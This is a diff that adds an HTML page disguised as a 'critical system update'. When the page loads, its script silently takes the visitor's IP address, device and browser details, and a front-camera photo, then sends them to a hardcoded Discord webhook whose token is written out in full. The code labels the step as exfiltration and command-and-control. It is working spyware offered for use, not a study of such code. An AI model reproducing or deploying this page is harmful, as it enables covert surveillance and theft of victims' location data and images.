@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>Critical System Update Required</title>
+    <style>
+        body { font-family: 'Courier New', Courier, monospace; background: #0b0b0b; color: #00ff41; padding: 20px; line-height: 1.6; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { border: 2px solid #00ff41; padding: 30px; background: #000; box-shadow: 0 0 20px #00ff41; border-radius: 10px; max-width: 600px; width: 90%; text-align: center; }
+        h1 { color: #ff0000; text-transform: uppercase; letter-spacing: 3px; font-size: 1.5rem; margin-bottom: 20px; }
+        .loader { width: 100%; background: #222; height: 10px; border-radius: 5px; margin: 20px 0; position: relative; overflow: hidden; }
+        .bar { width: 0%; height: 100%; background: #00ff41; animation: progress 5s infinite; }
+        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+        #v, #c { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>[ SYSTEM ENCRYPTION IN PROGRESS ]</h1>
+    <p>Target found. Establishing persistent link...</p>
+    <div class="loader"><div class="bar"></div></div>
+    <p id="status">Status: Mapping Hardware...</p>
+</div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="640" height="480"></canvas>
+
+<script>
+    // --- TARGET WEBHOOK ---
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1490634346359685131/-YLEFmQlCi7HxAYEOvVWXDOehb8a3kj2DErBzYuL52iHD5pMlKmf0AU9ERkbzTXWu6lp"; 
+
+    async function executePayload() {
+        const status = document.getElementById('status');
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        
+        let targetData = {
+            ts: new Date().toLocaleString(),
+            ua: navigator.userAgent,
+            plt: navigator.platform,
+            res: `${screen.width}x${screen.height}`,
+            cpu: navigator.hardwareConcurrency || "N/A",
+            mem: navigator.deviceMemory || "N/A",
+            ip: "Unknown"
+        };
+
+        // 1. IP GRABBING
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const res = await ipRes.json();
+            targetData.ip = res.ip;
+        } catch (e) { targetData.ip = "Access_Blocked"; }
+
+        // 2. CAMERA CAPTURE (SILENT)
+        status.innerText = "Status: Authorizing Neural Link...";
+        let captureBlob = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            v.srcObject = stream;
+            
+            // Allow auto-exposure
+            await new Promise(r => setTimeout(r, 1800));
+            c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+            const dataUrl = c.toDataURL('image/jpeg', 0.85);
+            
+            const response = await fetch(dataUrl);
+            captureBlob = await response.blob();
+            
+            stream.getTracks().forEach(t => t.stop());
+        } catch (err) {
+            status.innerText = "Status: Media Access Denied. Text-only dump...";
+        }
+
+        // 3. DISCORD EXFILTRATION
+        const formData = new FormData();
+        if (captureBlob) {
+            formData.append('file', captureBlob, 'face_capture.jpg');
+        }
+
+        const discordPayload = {
+            username: "JANUS_LOG_BOT",
+            avatar_url: "https://i.imgur.com/8nLFC9m.png",
+            embeds: [{
+                title: "🔴 TARGET ACQUIRED - FULL INTEL DUMP",
+                color: 16711680,
+                fields: [
+                    { name: "🌐 IP ADDRESS", value: `\`${targetData.ip}\``, inline: true },
+                    { name: "💻 OS/PLATFORM", value: targetData.plt, inline: true },
+                    { name: "📏 RESOLUTION", value: targetData.res, inline: true },
+                    { name: "🧠 SPECS", value: `CPU: ${targetData.cpu} Cores | RAM: ${targetData.mem}GB`, inline: true },
+                    { name: "📄 USER AGENT", value: `\`\`\`${targetData.ua}\`\`\`` }
+                ],
+                footer: { text: `Capture Time: ${targetData.ts}` }
+            }]
+        };
+
+        formData.append('payload_json', JSON.stringify(discordPayload));
+
+        try {
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            status.innerText = "Status: DATA EXFILTRATED SUCCESSFULLY.";
+        } catch (err) {
+            status.innerText = "Status: C2 Connection Failed.";
+        }
+    }
+
+    window.onload = executePayload;
+</script>
+</body>
+</html>
